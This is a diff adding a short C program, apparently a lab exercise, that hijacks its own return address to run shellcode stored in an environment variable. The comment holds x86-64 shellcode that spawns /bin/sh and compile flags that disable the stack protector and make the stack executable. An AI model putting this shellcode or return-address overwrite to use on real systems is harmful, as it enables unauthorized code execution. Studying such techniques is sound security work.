@@ -1,0 +1,18 @@
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/**
+ * export SHELLCODE=$(printf "\xeb\x17\x5f\x48\x31\xd2\x48\x31\xc0\x48\x89\xe6\x48\x89\x54\x24\x08\x48\x89\x3c\x24\xb0\x3b\x0f\x05\xe8\xe4\xff\xff\xff/bin/sh")
+ * clang -Wno-format-security -fno-stack-protector -z execstack environment_variable_shellcode.c
+ */
+
+int main(void) {
+  intptr_t *ret;
+  ret = (intptr_t *) &ret + 2;
+  char *shellcode = getenv("SHELLCODE");
+  printf("SHELLCODE = %p %s\n", shellcode, shellcode);
+  (*ret) = (intptr_t) shellcode;
+  printf("%p\n", (void*)(*ret));
+}
